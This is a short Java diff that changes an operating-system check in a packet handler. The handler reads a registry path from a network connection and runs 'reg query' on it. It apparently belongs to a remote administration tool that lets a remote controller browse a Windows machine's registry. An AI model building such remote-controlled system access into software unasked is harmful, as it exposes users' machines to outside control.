@@ -15,7 +15,7 @@ public class Packet79BrowseRegistry extends AbstractIncomingPacket {
 	public void read() throws Exception {
 		String path = Connection.readLine();
 		try {
-			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
+			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
 				Process p = Runtime.getRuntime().exec(new String[] { "reg", "query", path });
 
 				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
